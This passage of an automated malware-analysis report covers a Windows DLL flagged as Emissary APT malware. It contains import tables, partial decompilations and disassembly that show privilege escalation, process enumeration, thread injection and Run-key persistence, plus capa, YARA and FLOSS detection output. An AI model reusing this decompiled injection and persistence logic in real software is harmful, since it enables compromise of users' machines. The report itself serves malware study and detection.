+| 17536 | kernel32.CreateRemoteThread | IMPORT | 2 |
+| 17540 | kernel32.WriteProcessMemory | IMPORT | 2 |
+| 17544 | kernel32.VirtualProtectEx | IMPORT | 4 |
+| 17548 | kernel32.SetLastError | IMPORT | 4 |
+| 17552 | kernel32.lstrlenA | IMPORT | 8 |
+| 17556 | kernel32.VirtualAllocEx | IMPORT | 2 |
+| 17560 | kernel32.lstrcmpiA | IMPORT | 1 |
+| 17564 | kernel32.Module32Next | IMPORT | 1 |
+| 17568 | kernel32.Module32First | IMPORT | 1 |
+| 17572 | kernel32.Process32Next | IMPORT | 1 |
+| 17576 | kernel32.Process32First | IMPORT | 1 |
+| 17580 | kernel32.GetModuleHandleA | IMPORT | 2 |
+| 17584 | kernel32.GetCurrentProcess | IMPORT | 2 |
+| 17588 | kernel32.RemoveDirectoryA | IMPORT | 1 |
+| 17592 | kernel32.Sleep | IMPORT | 3 |
+| 17596 | kernel32.LockResource | IMPORT | 1 |
+| 17600 | kernel32.FreeLibrary | IMPORT | 1 |
+| 17604 | kernel32.LoadLibraryA | IMPORT | 1 |
+| 17608 | kernel32.SizeofResource | IMPORT | 1 |
+| 17612 | kernel32.FindResourceW | IMPORT | 1 |
+| 17616 | kernel32.MultiByteToWideChar | IMPORT | 2 |
+| 17620 | kernel32.CreateDirectoryA | IMPORT | 3 |
+| 17624 | kernel32.GetLastError | IMPORT | 5 |
+| 17628 | kernel32.CreateFileA | IMPORT | 7 |
+
+### Functions (30)
+| EA | Name |
+|---|---|
+| 3488 | sub_100019a0 |
+| 14770 | sub_100045b2 |
+| 2464 | sub_100015a0 |
+| 1264 | sub_100010f0 |
+| 2016 | sub_100013e0 |
+| 4736 | sub_10001e80 |
+| 5888 | sub_10002300 |
+| 6816 | sub_100026a0 |
+| 11347 | sub_10003853 |
+| 11114 | sub_1000376a |
+| 10937 | sub_100036b9 |
+| 7466 | sub_1000292a |
+| 8524 | sub_10002d4c |
+| 1024 | sub_10001000 |
+| 3104 | sub_10001820 |
+| 14980 | sub_10004684 |
+| 5584 | sub_100021d0 |
+| 9364 | sub_10003094 |
+| 5712 | sub_10002250 |
+| 7680 | sub_10002a00 |
+| 7866 | sub_10002aba |
+| 2976 | sub_100017a0 |
+| 1184 | sub_100010a0 |
+| 1136 | sub_10001070 |
+| 14177 | sub_10004361 |
+| 10859 | sub_1000366b |
+| 6768 | sub_10002670 |
+| 9330 | sub_10003072 |
+| 6752 | Setting |
+| 7644 | jmp_msvcrt._errno |
+
+### Decompilations (top 6)
+#### 3488 — sub_100019a0
+```c
+
+/* DISPLAY WARNING: Type casts are NOT being printed */
+
+void sub_100019a0(undefined4 param_1,undefined4 param_2,undefined4 param_3)
+
+{
+    int32_t iVar1;
+    undefined4 uVar2;
+    int32_t iVar3;
+    undefined4 *puVar4;
+    undefined4 *puVar5;
+    undefined4 uStack_5bc;
+    undefined4 uStack_5b8;
+    undefined4 uStack_5b4;
+    undefined auStack_5b0 [24];
+    undefined4 uStack_598;
+    undefined auStack_594 [520];
+    undefined4 uStack_38c;
+    undefined auStack_388 [4];
+    undefined4 uStack_384;
+    int32_t iStack_260;
+    undefined4 auStack_25c [11];
+    undefined auStack_22e [222];
+    int32_t iStack_150;
+    undefined4 uStack_14c;
+    undefined auStack_148 [8];
+    undefined4 uStack_140;
+    int32_t iStack_13c;
+    int32_t iStack_138;
+    undefined4 uStack_134;
+    undefined4 uStack_130;
+    int32_t iStack_12c;
+    undefined4 uStack_128;
+    undefined4 uStack_124;
+    int32_t iStack_120;
+    undefined4 uStack_11c;
+    undefined4 uStack_118;
+    undefined auStack_114 [268];
+    uint32_t uStack_8;
+    
+    uStack_8 = [0x0x10007000#SecurityCookie] ^ &stack0xfffffffc;
+    sub_100026a0("Removing...");
+    (*kernel32.Sleep)(1000);
+    iVar1 = (*shell32.SHGetSpecialFolderPathA)(0, auStack_114, 0x1a, 0);
+    if (iVar1 != 0) {
+        _strcat_s(auStack_114, 0x104, "\\LocalData\\");
+        (*kernel32.RemoveDirectoryA)(auStack_114);
+        (*kernel32.CreateDirectoryA)(auStack_114, 0);
+        uStack_124 = 0;
+        puVar4 = &autorun;
+        puVar5 = auStack_25c;
+        for (iVar1 = 0xb; iVar1 != 0; iVar1 = iVar1 + -1) {
+            *puVar5 = *puVar4;
+            puVar4 = puVar4 + 1;
+            puVar5 = puVar5 + 1;
+        }
+        *puVar5 = *puVar4;
+        jmp_msvcrt.memset(auStack_22e, 0, 0xd6);
+        iVar1 = (*advapi32.RegOpenKeyExA)(0x80000001, auStack_25c, 0, 2, &uStack_124);
+        if (iVar1 == 0) {
+            (*advapi32.RegDeleteValueA)(uStack_124, "SystemDrive");
+            (*advapi32.RegCloseKey)(uStack_124);
+            uStack_11c = 0;
+            uStack_134 = 0;
+            iStack_120 = 0;
+            iStack_138 = 0;
+            iStack_12c = 0;
+            uStack_128 = 0;
+            uStack_130 = 0;
+            uStack_118 = 0;
+            iStack_260 = 0;
+            iStack_150 = 0;
+            uStack_38c = 0x128;
+            jmp_msvcrt.memset(auStack_388, 0, 0x124);
+            uVar2 = (*kernel32.GetCurrentProcess)(0x28, &uStack_128);
+            iVar1 = (*advapi32.OpenProcessToken)(uVar2);
+            if (iVar1 != 0) {
+                (*advapi32.LookupPrivilegeValueA)(0, "SeDebugPrivilege", auStack_148);
+                uStack_14c = 1;
+                uStack_140 = 2;
+                (*advapi32.AdjustTokenPrivileges)(uStack_128, 0, &uStack_14c, 0, 0, 0);
+            }
+            iStack_138 = jmp_kernel32.CreateToolhelp32Snapshot(2, 0);
+            if (iStack_138 != -1) {
+                uVar2 = (*kernel32.GetModuleHandleA)("kernel32.dll", "FreeLibrary");
+                iStack_13c = (*kernel32.GetProcAddress)(uVar2);
+                if (iStack_13c != 0) {
+                    iStack_260 = jmp_kernel32.Process32First(iStack_138, &uStack_38c);
+                    while (iStack_260 != 0) {
+                        iStack_120 = (*kernel32.OpenProcess)(0x1fffff, 1, uStack_384);
+                        if (iStack_120 != 0) {
+                            iStack_12c = jmp_kernel32.CreateToolhelp32Snapshot(8, uStack_384);
+                            if (iStack_12c != -1) {
+                                uStack_5b4 = 0x224;
+                                jmp_msvcrt.memset(auStack_5b0, 0, 0x220);
+                                iStack_150 = jmp_kernel32.Module32First(iStack_12c, &uStack_5b4);
+                                while (iStack_150 != 0) {
+                                    iVar1 = (*kernel32.lstrcmpiA)("A08E81B411.DAT", auStack_594);
+                                    if (iVar1 == 0) {
+                                        iVar1 = (*kernel32.lstrlenA)("A08E81B411.DAT", 0x1000, 0x40);
+                      
+```
+#### 14770 — sub_100045b2
+```c
+
+/* DISPLAY WARNING: Type casts are NOT being printed */
+
+void sub_100045b2(void)
+
+{
+    uint32_t uVar1;
+    uint32_t uVar2;
+    uint32_t uVar3;
+    uint32_t uVar4;
+    uint32_t uStack_14;
+    uint32_t uStack_10;
+    uint32_t uStack_c;
+    uint32_t uStack_8;
+    
+    uStack_c = 0;
+    uStack_8 = 0;
+    if (([0x0x10007000#SecurityCookie] == 0xbb40e64e) || (([0x0x10007000#SecurityCookie] & 0xffff0000) == 0)) {
+        (*kernel32.GetSystemTimeAsFileTime)(&uStack_c);
+        uVar4 = uStack_8 ^ uStack_c;
+        uVar1 = (*kernel32.GetCurrentProcessId)();
+        uVar2 = (*kernel32.GetCurrentThreadId)();
+        uVar3 = (*kernel32.GetTickCount)();
+        (*kernel32.QueryPerformanceCounter)(&uStack_14);
+        uVar1 = uVar4 ^ uVar1 ^ uVar2 ^ uVar3 ^ uStack_10 ^ uStack_14;
+        if ((uVar1 == 0xbb40e64e) || (([0x0x10007000#SecurityCookie] & 0xffff0000) == 0)) {
+            uVar1 = 0xbb40e64f;
+        }
+        10007004 = ~uVar1;
+        10007000 = uVar1;
+    }
+    else {
+        10007004 = ~[0x0x10007000#SecurityCookie];
+    }
+    return;
+}
+
+```
+#### 2464 — sub_100015a0
+```c
+
+/* DISPLAY WARNING: Type casts are NOT being printed */
+
+void sub_100015a0(undefined4 *param_1)
+
+{
+    uint8_t uVar1;
+    uint32_t uVar2;
+    int32_t iVar3;
+    undefined4 *puVar4;
+    uint32_t uStack_1b0;
+    undefined uStack_1ac;
+    undefined auStack_1ab [267];
+    uint8_t *puStack_a0;
+    undefined4 uStack_9c;
+    int32_t iStack_98;
+    undefined4 uStack_94;
+    undefined auStack_90 [136];
+    uint32_t uStack_8;
+    
+    uStack_8 = [0x0x10007000#SecurityCookie] ^ &stack0xfffffffc;
+    uStack_94 = 0;
+    jmp_msvcrt.memset(auStack_90, 0, 0x80);
+    if (param_1 != 0x0) {
+        puVar4 = &uStack_94;
+        for (iVar3 = 0x21; iVar3 != 0; iVar3 = iVar3 + -1) {
+            *puVar4 = *param_1;
+            param_1 = param_1 + 1;
+            puVar4 = puVar4 + 1;
+        }
+    }
+    (*msvcrt.srand)(0xa03);
+    for (uStack_1b0 = 0; uStack_1b0 < 0x84; uStack_1b0 = uStack_1b0 + 1) {
+        puStack_a0 = auStack_90 + (uStack_1b0 - 4);
+        uVar1 = *puStack_a0;
+        uVar2 = (*msvcrt.rand)();
+        uVar2 = uVar2 & 0x8000007f;
+        if (uVar2 < 0) {
+            uVar2 = (uVar2 - 1 | 0xffffff80) + 1;
+        }
+        *puStack_a0 = uVar1 ^ uVar2;
+    }
+    uStack_1ac = 0;
+    jmp_msvcrt.memset(auStack_1ab, 0, 0x103);
+    sub_100010a0(&uStack_1ac, 0x104);
+    uStack_9c = 0;
+    iStack_98 = (*kernel32.CreateFileA)(&uStack_1ac, 0x40000000, 0, 0, 4, 0, 0);
+    if (iStack_98 != -1) {
+        (*kernel32.SetFilePointer)(iStack_98, 0x488, 0, 0);
+        (*kernel32.WriteFile)(iStack_98, &uStack_94, 0x84, &uStack_9c, 0);
+        (*kernel32.CloseHandle)(iStack_98);
+    }
+    @__security_check_cookie@4();
+    return;
+}
+
+```
+
+### Carved Files (1)
+| Name | Type | Size |
+|---|---|---|
+| ? | PE | 52736 |
+
+### Virtual Files (3)
+| Path / Name | Unpacked Size | Type |
+|---|---|---|
+| ASDASDASDASDSAD/102/en-us | 52736 | - |
+| VER/1/en-us | 708 | - |
+| MANIF/2/en-us | 346 | - |
+
+### Structures (42)
+| Name | EA |
+|---|---|
+| MZ | 0 |
+| RichHeader | 128 |
+| PE | 264 |
+| OptionalHeader | 288 |
+| Sections | 512 |
+| advapi32.FT | 17408 |
+| kernel32.FT | 17436 |
+| rpcrt4.FT | 17660 |
+| shell32.FT | 17672 |
+| msvcrt.FT | 17680 |
+| ole32.FT | 17776 |
+| LoadConfigurationTable | 19480 |
+| SEHandlers | 19552 |
+| ImportTable | 19716 |
+| advapi32.OFT | 19856 |
+| kernel32.OFT | 19884 |
+| rpcrt4.OFT | 20108 |
+| shell32.OFT | 20120 |
+| msvcrt.OFT | 20128 |
+| ole32.OFT | 20224 |
+| ImportNames | 20232 |
+| ExportDirectory | 21776 |
+| ExportAddressTable | 21816 |
+| ExportNameTable | 21820 |
+| OrdinalNameTable | 21824 |
+| ExportNames | 21826 |
+| SecurityCookie | 25600 |
+| Resources | 29696 |
+| Resources.ASDASDASDASDSAD | 29736 |
+| Resources.VER | 29760 |
+
+
+## capa Capability Rules
+engine: `malcat-capa` · Total rules: 30 · duration_s: 0.92
+
+| Rule | ATT&CK | MBC |
+|---|---|---|
+| contain obfuscated stackstrings | T1027.005:Obfuscated Files or Information | B0032.020:Executable Code Obfuscation, B0032.017:Executable Code Obfuscation |
+| reference Base64 string | T1027:Obfuscated Files or Information | C0026.001:Encode Data, C0019:Check String |
+| get common file path | T1083:File and Directory Discovery | E1083:File and Directory Discovery |
+| get file size | T1083:File and Directory Discovery | E1083:File and Directory Discovery |
+| inject thread | T1055.003:Process Injection, T1620:Reflective Code Loading |  |
+| enumerate processes | T1057:Process Discovery, T1518:Software Discovery |  |
+| delete registry value | T1112:Modify Registry | C0036.007:Registry |
+| spawn thread to RWX shellcode |  | C0007:Allocate Memory, C0038:Create Thread |
+| persist via Run registry key | T1547.001:Boot or Logon Autostart Execution | F0012:Registry Run Keys / Startup Folder |
+| contain an embedded PE file |  | B0023:Install Additional Program |
+| get Program Files directory | T1083:File and Directory Discovery |  |
+| copy file |  | C0045:Copy File |
+| create directory |  | C0046:Create Directory |
+| delete directory |  | C0048:Delete Directory |
+| delete file |  | C0047:Delete File |
+
+## PE Imports / Signals
+import_count: 88
+
+| label | api_match | ATT&CK |
+|---|---|---|
+| allocate_memory | VirtualAllocEx | T1055 |
+| write_process_memory | WriteProcessMemory | T1055 |
+| create_remote_thread | CreateRemoteThread | T1055 |
+| create_process | CreateProcess | T1106 |
+| load_library | LoadLibrary | T1129 |
+| get_proc_address | GetProcAddress | T1129 |
+| change_memory_protection | VirtualProtect | T1055 |
+
+## YARA Matches (pipeline)
+Total matches: 26
+
+| Rule | Namespace | Match strings (trimmed) |
+|---|---|---|
+| domain | - | $domain_regex@0 len=2 |
+| IP | - | $ipv6@60279 len=2 |
+| contains_base64 | - | $a@16611 len=12 |
+| System_Tools | - |  |
+| Dropper_Strings | - | $a0@16899 len=18 |
+| Misc_Suspicious_Strings | - | $a4@61976 len=7 |
+| SHA512_Constants | - | $c1@58812 len=4; $c3@58820 len=4; $c5@58828 len=4; $c7@58836 len=4 |
+| BASE64_table | - | $c0@58736 len=64 |
+| Emissary_APT_Malware_1 | - | $s1@61976 len=18; $s2@61996 len=20; $s3@17696 len=25; $s4@61864 len=28; $s5@60320 len=50; $s6@61412 len=32; $s7@70960 len=20; $s8@61896 len=40 |
+| IsPE32 | - |  |
+| IsDLL | - |  |
+| IsWindowsGUI | - |  |
+| HasRichSignature | - | $a0@240 len=4 |
+| Visual_Cpp_2005_DLL_Microsoft | - | $a@10359 len=9 |
+| Visual_Cpp_2003_DLL_Microsoft | - | $a@7466 len=5 |
+| SEH_Save | - | $a@8549 len=7 |
+| SEH_Init | - | $a@14706 len=6; $b@8567 len=7 |
+| Check_OutputDebugStringA_iat | - |  |
+| anti_dbg | - | $d1@16664 len=12; $c3@19564 len=17 |
+| inject_thread | - | $c1@19118 len=11; $c2@19380 len=14; $c4@19446 len=18; $c5@19468 len=18; $c6@67782 len=12; $c7@19118 len=11 |
+| escalate_priv | - | $d1@20102 len=12; $c1@16932 len=16; $c2@20080 len=21 |
+| win_mutex | - | $c1@19636 len=11 |
+| win_registry | - | $f1@20102 len=12; $c2@19988 len=13; $c3@20004 len=11; $c4@68498 len=14; $c6@20004 len=11 |
+| win_token | - | $f1@20102 len=12; $c2@20080 len=21; $c3@20036 len=16; $c4@20056 len=21 |
+| win_files_operation | - | $f1@16664 len=12; $c1@19016 len=9; $c2@19054 len=14; $c3@19016 len=9; $c4@19042 len=8; $c5@19512 len=11; $c6@19002 len=11 |
+| Str_Win32_Winsock2_Library | - | $wsock2_lib@68580 len=11 |
+
+## Generated YARA Meta
+```json
+{
+  "rule_count": 26,
+  "matches": [
+    {
+      "rule": "domain",
+      "path": "/opt/samples/corpus/malware/bf0d6cc20fa7a20ed7b5d0c9283d7670f73c33d7f8b3c3261aae04969c40ce76/ishelp.dll",
+      "strings": [
+        {
+          "id": "$domain_regex",
+          "offset": 0,
+          "length": 2,
+          "xor_key": null
+        }
+      ]
+    },
+    {
+      "rule": "IP",
+      "path": "/opt/samples/corpus/malware/bf0d6cc20fa7a20ed7b5d0c9283d7670f73c33d7f8b3c3261aae04969c40ce76/ishelp.dll",
+      "strings": [
+        {
+          "id": "$ipv6",
+          "offset": 60279,
+          "length": 2,
+          "xor_key": null
+        }
+      ]
+    },
+    {
+      "rule": "contains_base64",
+      "path": "/opt/samples/corpus/malware/bf0d6cc20fa7a20ed7b5d0c9283d7670f73c33d7f8b3c3261aae04969c40ce76/ishelp.dll",
+      "strings": [
+        {
+          "id": "$a",
+          "offset": 16611,
+          "length": 12,
+          "xor_key": null
+        }
+      ]
+    },
+    {
+      "rule": "System_Tools",
+      "path": "/opt/samples/corpus/malware/bf0d6cc20fa7a20ed7b5d0c9283d7670f73c33d7f8b3c3261aae04969c40ce76/ishelp.dll",
+      "strings": []
+    },
+    {
+      "rule": "Dropper_Strings",
+      "path": "/opt/samples/corpus/malware/bf0d6cc20fa7a20ed7b5d0c9283d7670f73c33d7f8b3c3261aae04969c40ce76/ishelp.dll",
+      "strings": [
+        {
+          "id": "$a0",
+          "offset": 16899,
+          "length": 18,
+          "xor_key": null
+        }
+      ]
+    },
+    {
+      "rule": "Misc_Suspicious_Strings",
+      "path": "/opt/samples/corpus/malware/bf0d6cc20fa7a20ed7b5d0c9283d7670f73c33d7f8b3c3261aae04969c40ce76/ishelp.dll",
+      "strings": [
+        {
+          "id": "$a4",
+          "offset": 61976,
+          "length": 7,
+          "xor_key": null
+        }
+      ]
+    },
+    {
+      "rule": "SHA512_Constants",
+      "path": "/opt/samples/corpus/malware/bf0d6cc20fa7a20ed7b5d0c9283d7670f73c33d7f8b3c3261aae04969c40ce76/ishelp.dll",
+      "strings": [
+        {
+          "id": "$c1",
+          "offset": 58812,
+          "length": 4,
+          "xor_key": null
+        },
+        {
+          "id": "$c3",
+          "offset": 58820,
+          "length": 4,
+          "xor_key": null
+        },
+        {
+          "id": "$c5",
+          "offset": 58828,
+          "length": 4,
+          "xor_key": null
+        },
+        {
+          "id": "$c7",
+          "offset": 58836,
+          "length": 4,
+          "xor_key": null
+        }
+      ]
+    },
+    {
+      "rule": "BASE64_table",
+      "path": "/opt/samples/corpus/malware/bf0d6cc20fa7a20ed7b5d0c9283d7670f73c33d7f8b3c3261aae04969c40ce76/ishelp.dll",
+      "strings": [
+        {
+          "id": "$c0",
+          "offset": 58736,
+          "length": 64,
+          "xor_key": null
+        }
+      ]
+    },
+    {
+      "rule": "Emissary_APT_Malware_1",
+      "path": "/opt/samples/corpus/malware/bf0d6cc20fa7a20ed7b5d0c9283d7670f73c33d7f8b3c3261aae04969c40ce76/ishelp.dll",
+      "strings": [
+        {
+          "id": "$s1",
+          "offset": 61976,
+          "length": 18,
+          "xor_key": null
+        },
+        {
+          "id": "$s2",
+          "offset": 61996,
+          "length": 20,
+          "xor_key": null
+        },
+        {
+          "id": "$s3",
+          "offset": 17696,
+          "length": 25,
+          "xor_key": null
+        },
+        {
+          "id": "$s4",
+          "offset": 61864,
+          "length": 28,
+          "xor_key": null
+        },
+        {
+          "id": "$s5",
+          "offset": 60320,
+          "length": 50,
+          "xor_key": null
+        },
+        {
+          "id": "$s6",
+          "offset": 61412,
+          "length": 32,
+          "xor_key": null
+        },
+        {
+          "id": "$s7",
+          "offset": 70960,
+          "length": 20,
+          "xor_key": null
+        },
+        {
+          "id": "$s8",
+          "offset": 61896,
+          "length": 40,
+          "xor_key": null
+        }
+      ]
+    },
+    {
+      "rule": "IsPE32",
+      "path": "/opt/samples/corpus/m
+```
+
+## FLOSS Strings
+Total strings: 619 · per_category: `{"decoded_strings": 2, "stack_strings": 3, "tight_strings": 0, "language_strings": 0, "language_strings_missed": 0, "static_strings": 614}`
+
+### High-signal FLOSS
+- `Kernel32.dll`
+- `ReleaseFile Error->LoadLibrary Failed[%d].`
+- `ReleaseFile->GetProcAddress Failed[%d].`
+- `kernel32.dll`
+- `LoadLibraryA`
+- `_MICROSOFT_LOADER_MUTEX_`
+
+### FLOSS sample
+- `\Internet Explorer\iexplore.exe`
+- `000A758C8FEAE5F.TMP`
+- `-3$1-$3`
+- `7/+.1$1`
+- `($7/+.1$`
+- `!This program cannot be run in DOS mode.`
+- `3 !23;`
+- `!23Rich`
+- ``.rdata`
+- `@.data`
+- `@.reloc`
+- `Qj&hTs`
+- `0SSSSS`
+- `0WWWWW`
+- `AAFFf;`
+- `URPQQh`
+- `v	N+D$`
+- `YSSSSS`
+- `HHtXHHt`
+- `>If90t`
+- `UQPXY]Y[`
+- `Invalid parameter passed to C runtime function.`
+- `(null)`
+- ````hhh`
+- `xppwpp`
+- `%d/%02d/%02d %02d:%02d:%02d -`
+- `ReleaseFile Error->FindResource Failed[%d].`
+- `ReleaseFile Error->Size=0.`
+- `Kernel32.dll`
+- `ReleaseFile Error->LoadLibrary Failed[%d].`
+- `LoadResource`
+- `ReleaseFile->GetProcAddress Failed[%d].`
+- `ReleaseFile->ProLdRsc Failed.`
+- `ReleaseFile->CreateFile Failed[%d].`
+- `Removing...`
+- `\LocalData\`
+- `Software\Microsoft\Windows\CurrentVersion\Run`
+- `SystemDrive`
+- `SeDebugPrivilege`
+- `FreeLibrary`
+
+## .NET Analysis
+- is_dotnet: false (not observed)
+
+## radare2 Disassembly (attach in Static Code Analysis)
+### 0x10003477
+```asm
+┌ 400: entry0 (int32_t arg_8h, int32_t arg_ch, int32_t arg_10h);
+│       ╎   ; arg int32_t arg_8h @ ebp+0x8
+│       ╎   ; arg int32_t arg_ch @ ebp+0xc
+│       ╎   ; arg int32_t arg_10h @ ebp+0x10
+│       ╎   ; var int32_t var_4h @ ebp-0x4
+│       ╎   ; var int32_t var_1ch @ ebp-0x1c
+│       ╎   0x10003477      8bff           mov edi, edi
+│       ╎   0x10003479      55             push ebp
+│       ╎   0x1000347a      8bec           mov ebp, esp
+│       ╎   0x1000347c      837d0c01       cmp dword [arg_ch], 1
+│      ┌──< 0x10003480      7505           jne 0x10003487
+│      │╎   0x10003482      e82b110000     call 0x100045b2
+│      └──> 0x10003487      5d             pop ebp
+│       └─< 0x10003488      e98efdffff     jmp 0x1000321b
+..
+            ; XREFS: CALL 0x10002328  CALL 0x10002345  CALL 0x1000235f  
+            ; XREFS: CALL 0x1000237c  CALL 0x10002399  CALL 0x100023b8  
+            ; XREFS: CALL 0x100023d5  CALL 0x100025d2  
+```
+### 0x10002660
+```asm
+┌ 10: sym.Loader.dll_Setting ();
+│           0x10002660      55             push ebp
+│           0x10002661      8bec           mov ebp, esp
+│           0x10002663      e898fcffff     call fcn.10002300
+│           0x10002668      5d             pop ebp
+└           0x10002669      c3             ret
+```
+### 0x10002300
+```asm
+; CALL XREF from sym.Loader.dll_Setting @ 0x10002663(x)
+┌ 852: fcn.10002300 ();
+│           ; var int32_t var_4h @ ebp-0x4
+│           ; var int32_t var_20eh @ ebp-0x20e
+│           ; var int32_t var_210h @ ebp-0x210
+│           ; var int32_t var_317h @ ebp-0x317
+│           ; var int32_t var_318h @ ebp-0x318
+│           ; var int32_t var_31ch @ ebp-0x31c
+│           ; var int32_t var_427h @ ebp-0x427
+│           ; var int32_t var_428h @ ebp-0x428
+│           ; var int32_t var_52fh @ ebp-0x52f
+│           ; var int32_t var_530h @ ebp-0x530
+│           ; var int32_t var_637h @ ebp-0x637
+│           ; var int32_t var_638h @ ebp-0x638
+│           ; var int32_t var_72eh @ ebp-0x72e
+│           ; var int32_t var_730h @ ebp-0x730
+│           ; var int32_t var_734h @ ebp-0x734
+│           ; var int32_t var_738h @ ebp-0x738
+│           ; var int32_t var_73ch @ ebp-0x73c
+│           ; var int32_t var_73fh @ ebp-0x73f
+│           ; var int32_t var_740h @ ebp-0x740
+│           ; var int32_t var_773h @ ebp-0x773
+│           ; var int32_t var_774h @ ebp-0x774
+│           ; var int32_t var_7fch @ ebp-0x7fc
+│           ; var int32_t var_800h @ ebp-0x800
+│           ; var int32_t var_810h @ ebp-0x810
+│           ; var int32_t var_814h @ ebp-0x814
+│           0x10002300      55             push ebp
+│           0x10002301      8bec           mov ebp, esp
+│           0x10002303      81ec14080000   sub esp, 0x814
+│           0x10002309      a100700010     mov eax, dword [section..data] ; [0x10007000:4]=0xbb40e64e ; "N\xe6@\xbb\xb1\x19\xbfD"
+│           0x1000230e      33c5           xor eax, ebp
+│           0x10002310      8945fc         mov dword [var_4h], eax
+│           0x10002313      c685c8f9ff..   mov byte [var_638h], 0
+│           0x1000231a      6803010000     push 0x103                  ; 259
+│           0x1000231f      6a00           push 0
+│           0x10002321      8d85c9f9ffff   lea eax, [var_637h]
+│           0x10002327      50             push eax
+│           0x10002328      e8d9120000     call 0x10003606
+│           0x1000232d      83c40c         add esp, 0xc
+│           0x10002330      c685d8fbff..   mov byte [var_428h], 0
+│           0x10002337      6803010000     push 0x103                  ; 259
+│           0x1000233c      6a00           push 0
+│           0x1000233e      8d8dd9fbffff   lea ecx, [var_427h]
+│           0x10002344      51             push ecx
+│           0x10002345      e8bc120000     call 0x10003606
+│           0x1000234a      83c40c         add esp, 0xc
+│           0x1000234d      c6858cf8ff..   mov byte [var_774h], 0
+│           0x10002354      6a31           push 0x31                   ; '1' ; 49
+│           0x10002356      6a00           push 0
+│           0x10002358      8d958df8ffff   lea edx, [var_773h]
+│           0x1000235e      52             push edx
+│           0x1000235f      e8a2120000     call 0x10003606
+│           0x10002364      83c40c         add esp, 0xc
+│           0x10002367      c685d0faff..   mov byte [var
+```
+
+## UPX Unpack
+- upx_ok: False
+- is_packed: False
+- returncode: None
+- unpacked_path: ``
+
+## XOR Search
+- Found XOR 00 position 00000000: 00000108 ........!..L.!This program cannot be r
+- Found XOR 00 position 00005908: 00000110 ........!..L.!This program cannot be r
+
+## Speakeasy (dynamic)
+- speakeasy_ok: True
+- api_calls: 0
+- key_events: 0
+- duration_s: None
+- **not observed**: no API calls/events recorded — do not invent runtime behavior
+
+## Frida Probe
+- frida_available: True
+- version: 17.16.4
+- hook_candidates:
+  - `msvcrt.dll!__badioinfo`
+  - `msvcrt.dll!wctomb`
+  - `msvcrt.dll!_itoa`
+  - `msvcrt.dll!_snprintf`
+  - `msvcrt.dll!_iob`
+  - `KERNEL32.dll!GetProcAddress`
+  - `KERNEL32.dll!GetSystemTimeAsFileTime`
+  - `KERNEL32.dll!GetCurrentProcessId`
+  - `KERNEL32.dll!GetCurrentThreadId`
+  - `KERNEL32.dll!GetTickCount`
+  - `ADVAPI32.dll!OpenProcessToken`
+  - `ADVAPI32.dll!RegCloseKey`
+  - `ADVAPI32.dll!AdjustTokenPrivileges`
+  - `ADVAPI32.dll!LookupPrivilegeValueA`
+  - `ADVAPI32.dll!RegOpenKeyExA`
+  - `SHELL32.dll!SHGetSpecialFolderPathA`
+  - `ole32.dll!CoCreateGuid`
+  - `RPCRT4.dll!RpcStringFreeA`
+  - `RPCRT4.dll!UuidToStringA`
